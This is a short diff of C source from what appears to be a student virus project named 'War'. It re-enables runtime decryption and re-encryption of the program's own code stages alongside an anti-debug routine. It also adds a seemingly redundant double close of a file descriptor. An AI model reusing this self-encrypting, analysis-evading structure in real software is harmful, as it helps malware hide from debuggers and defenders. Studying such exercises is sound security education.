@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/11 11:32:57 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/12 15:33:40 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -56,7 +56,7 @@ void	opening(t_data *data)
 	_log(de, _strlen(de));
 #endif
 
-	/* revert_one(&data->key, (char*)antidebug, (size_t)opening - (size_t)antidebug); */
+	revert_one(&data->key, (char*)antidebug, (size_t)opening - (size_t)antidebug);
 
 	int				fd[3];
 	int				limit;
@@ -91,13 +91,16 @@ void	opening(t_data *data)
 			}
 		}
 	}
+	_close(fd[0]);
 	data->context = true;
 
 next:
 	_close(fd[0]);
 	_close(fd[1]);
 	_close(fd[2]);
-	/* update_one(&data->key, (char*)opening, (size_t)war - (size_t)opening); */
-	/* revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war); */
+
+	update_one(&data->key, (char*)opening, (size_t)war - (size_t)opening);
+	revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war);
+
 	war(data);
 }
